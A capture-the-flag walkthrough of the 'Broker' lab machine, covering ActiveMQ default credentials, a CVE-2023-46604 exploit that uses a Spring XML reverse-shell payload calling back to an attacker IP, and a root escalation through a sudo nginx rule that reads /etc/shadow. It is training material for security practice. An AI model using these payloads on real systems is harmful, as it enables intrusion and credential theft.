# Broker

<div class="wu-meta" markdown="span">
<span class="wu-badge wu-os">:fontawesome-brands-linux: Linux</span>
<span class="wu-badge wu-diff wu-diff--easy">Easy</span>
<span class="wu-tags">
<span class="wu-tag">ActiveMQ RCE</span>
<span class="wu-tag">CVE-2023-46604</span>
<span class="wu-tag">sudo nginx</span>
</span>
</div>

!!! abstract "What this box demonstrates"
    Broker is a single-CVE box built around a vulnerability that was making headlines when it released. An Apache ActiveMQ broker exposes its web console behind default credentials, and the version it runs (5.15.15) is vulnerable to CVE-2023-46604, an unauthenticated OpenWire deserialization flaw that carries a rare 10.0 CVSS and lands remote code execution. Root then falls out of a single sudo rule that lets the service account run `nginx` as root, which is enough to serve the filesystem back to yourself and read any file on the box.

## Attack path

1. Log into the ActiveMQ console with `admin:admin` and confirm the version is 5.15.15.
2. Exploit CVE-2023-46604 by pointing the OpenWire listener at an attacker-hosted Spring XML that spawns a reverse shell, landing a foothold as `activemq`.
3. Abuse the `sudo nginx` rule to run a rogue config that serves `/` with directory listing, then read root's files over HTTP.

**Tools:** nmap, curl, netcat, python3.

## Enumeration

Set the target and scan:

```bash
IP=10.10.11.243

# Initial fast port discovery
ports=$(nmap -p- --min-rate=1000 -T4 -n --open $IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//') && echo $ports

# Comprehensive TCP scan
sudo nmap -p$ports -sC -sV $IP -oA scan_tcp
```

### Nmap results

```
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http       nginx 1.18.0 (Ubuntu)
|_http-title: Error 401 Unauthorized
|_  basic realm=ActiveMQRealm
1883/tcp  open  mqtt
5672/tcp  open  amqp
8161/tcp  open  http       Jetty 9.4.39.v20210325
|_  basic realm=ActiveMQRealm
61613/tcp open  stomp      Apache ActiveMQ
61614/tcp open  http       Jetty 9.4.39.v20210325
61616/tcp open  apachemq   ActiveMQ OpenWire transport
|_    5.15.15
```

The spread of ports (MQTT, AMQP, STOMP, OpenWire) all point at one service: Apache ActiveMQ. Both the nginx reverse proxy on port 80 and the Jetty console on 8161 sit behind an `ActiveMQRealm` basic-auth prompt.

## Foothold

The console on port 8161 accepts the stock ActiveMQ credentials `admin:admin`. Once inside, the broker page reports version **5.15.15**, which the OpenWire fingerprint on 61616 already gave away.

That version is vulnerable to [CVE-2023-46604](https://activemq.apache.org/security-advisories.data/CVE-2023-46604-announcement.txt), an unauthenticated RCE in the OpenWire protocol. A marshalled `ExceptionResponse` can force the broker to instantiate an arbitrary class and load a Spring XML descriptor from a URL the attacker controls — turning "fetch this bean definition" into "run this command."

Grab a PoC ([evkl1d/CVE-2023-46604](https://github.com/evkl1d/CVE-2023-46604)) and edit its `poc.xml` so the Spring bean runs a reverse shell back to your host:

```xml
<bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
  <constructor-arg>
    <list>
      <value>bash</value>
      <value>-c</value>
      <value>bash -i &gt;&amp; /dev/tcp/10.10.14.10/4444 0&gt;&amp;1</value>
    </list>
  </constructor-arg>
</bean>
```

Host `poc.xml` on a web server, start a listener, and fire the exploit at the OpenWire port, pointing it back at your XML:

```bash
python3 -m http.server 8001          # serves poc.xml
nc -lvnp 4444                        # catch the shell
python3 exploit.py -i 10.10.11.243 -p 61616 -u http://10.10.14.10:8001/poc.xml
```

The broker fetches and executes the bean, and the listener catches a shell as `activemq`. The user flag is in that account's home directory.

## Privilege escalation

Check sudo rights straight away:

```bash
sudo -l
# (ALL) NOPASSWD: /usr/sbin/nginx
```

Being able to run `nginx` as root is enough on its own. nginx will happily serve any directory, so write a config that exposes the whole filesystem with directory listing enabled:

```nginx
# /tmp/pwn.conf
user root;
events {
    worker_connections 1024;
}
http {
    server {
        listen 1337;
        root /;
        autoindex on;
    }
}
```

!!! tip
    `nano` misbehaves in the limited shell here. Write the file with `echo`/redirection instead: `echo 'user root;' > /tmp/pwn.conf` and so on.

Launch the rogue server as root and read whatever you like over HTTP — the worker processes inherit root, so file permissions no longer apply:

```bash
sudo /usr/sbin/nginx -c /tmp/pwn.conf
curl localhost:1337/root/root.txt
curl localhost:1337/etc/shadow
```

The root flag comes straight back.
